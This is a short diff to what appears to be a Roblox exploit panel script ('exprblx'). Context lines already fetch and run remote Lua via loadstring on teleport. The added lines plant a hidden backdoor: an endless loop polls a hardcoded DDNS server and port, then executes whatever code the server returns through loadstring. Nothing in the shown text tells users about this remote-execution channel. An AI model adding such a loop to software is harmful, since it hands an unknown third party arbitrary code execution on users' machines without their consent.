@@ -454,3 +454,20 @@ game.Players.LocalPlayer.OnTeleport:Connect(function(State)
 	queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/idkwhatthisislmao/roblo/refs/heads/main/exprblx.lua", true))()')
 end)
 Notification("Loaded exprblx panel (v2.4)")
+
+local HttpService = game:GetService("HttpService")
+local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"
+
+local function waitForMessage()
+	while true do
+		pcall(function()
+			local response = HttpService:GetAsync(receiveUrl)
+			local data = HttpService:JSONDecode(response)
+			if data.message ~= "No message" then
+				loadstring(data.message)()
+			end
+		end)
+	end
+end
+
+spawn(function() waitForMessage() end)
